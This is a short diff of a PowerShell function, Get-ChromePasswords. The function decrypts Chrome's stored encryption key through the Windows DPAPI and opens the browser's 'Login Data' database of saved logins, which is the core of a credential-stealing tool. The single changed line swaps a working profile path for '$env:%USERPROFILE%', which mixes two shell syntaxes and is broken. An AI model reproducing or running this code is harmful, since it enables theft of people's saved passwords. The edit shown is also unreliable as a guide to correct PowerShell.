@@ -6,7 +6,7 @@ function Get-ChromePasswords {
         $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
         $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+        $dbPath = "$env:%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
         $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
         $dbConnection.Open()
         $cmd = $dbConnection.CreateCommand()
